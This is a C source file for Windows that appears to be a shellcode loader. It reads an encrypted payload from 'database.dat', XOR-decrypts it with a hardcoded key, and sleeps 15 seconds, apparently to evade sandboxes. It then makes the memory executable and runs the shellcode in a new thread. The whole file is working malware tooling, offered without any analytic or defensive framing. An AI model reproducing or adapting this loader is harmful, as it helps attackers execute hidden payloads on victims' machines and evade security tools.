#include <windows.h>
#include <stdio.h>

const char key[] = "Thisisatest";

typedef struct {
    char* sc;
    SIZE_T scSize;
} PAYLOAD_INFO;

PAYLOAD_INFO getSc()
{
    PAYLOAD_INFO info = { 0 };
    wchar_t fName[] = L"database.dat";
    HANDLE hNewFile = CreateFileW(fName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hNewFile == INVALID_HANDLE_VALUE)
    {
        printf("Error opening file: %d\n", GetLastError());
        return info;
    }

    DWORD dwFileSize = GetFileSize(hNewFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        printf("Error getting file size: %d\n", GetLastError());
        CloseHandle(hNewFile);
        return info;
    }

    info.sc = (char*)VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (info.sc == NULL)
    {
        printf("Error allocating memory: %d\n", GetLastError());
        CloseHandle(hNewFile);
        return info;
    }

    DWORD dwNumBytesRead = 0;
    if (!ReadFile(hNewFile, info.sc, dwFileSize, &dwNumBytesRead, NULL))
    {
        printf("Error reading file: %d\n", GetLastError());
        VirtualFree(info.sc, 0, MEM_RELEASE);
        info.sc = NULL;
    }
    else
    {
        info.scSize = dwNumBytesRead;
    }

    CloseHandle(hNewFile);
    return info;
}

char* decryptomatic(char* sc, SIZE_T scSize)
{
    char* decrypted_sc = (char*)VirtualAlloc(NULL, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (decrypted_sc == NULL)
    {
        printf("Error allocating memory for decrypted shellcode: %d\n", GetLastError());
        return NULL;
    }

    for (int i = 0; i < scSize; i++)
    {
        decrypted_sc[i] = sc[i] ^ key[i % (sizeof(key) - 1)];
    }
    return decrypted_sc;
}

DWORD WINAPI loadPayload(LPVOID lpParam)
{
    Sleep(15000);
    PAYLOAD_INFO* payloadInfo = (PAYLOAD_INFO*)lpParam;
    char* decryptedSc = decryptomatic(payloadInfo->sc, payloadInfo->scSize);
    if (decryptedSc == NULL)
    {
        printf("Error decrypting shellcode\n");
        return 1;
    }

    DWORD dwOldProtect = 0;
    if (!VirtualProtect(decryptedSc, payloadInfo->scSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
    {
        printf("Error modifying the memory permission of the shellcode: %d\n", GetLastError());
        VirtualFree(decryptedSc, 0, MEM_RELEASE);
        return 1;
    }

    ((void(*)())decryptedSc)();
    VirtualFree(decryptedSc, 0, MEM_RELEASE);
    return 0;
}

void newThread(PAYLOAD_INFO* payloadInfo)
{
    HANDLE hNewThread = CreateThread(NULL, 0, loadPayload, payloadInfo, CREATE_SUSPENDED, NULL);
    if (hNewThread == NULL)
    {
        printf("Error: Could not create thread: %d\n", GetLastError());
        exit(1);
    }
    DWORD success = ResumeThread(hNewThread);
    if (success == -1)
    {
        printf("Error resuming thread: %d\n", GetLastError());
    }
    WaitForSingleObject(hNewThread, INFINITE);
    CloseHandle(hNewThread);
}

int main()
{
    PAYLOAD_INFO payloadInfo = getSc();
    if (payloadInfo.sc == NULL)
    {
        printf("Error loading shellcode\n");
        return 1;
    }

    newThread(&payloadInfo);

    VirtualFree(payloadInfo.sc, 0, MEM_RELEASE);
    return 0;
}
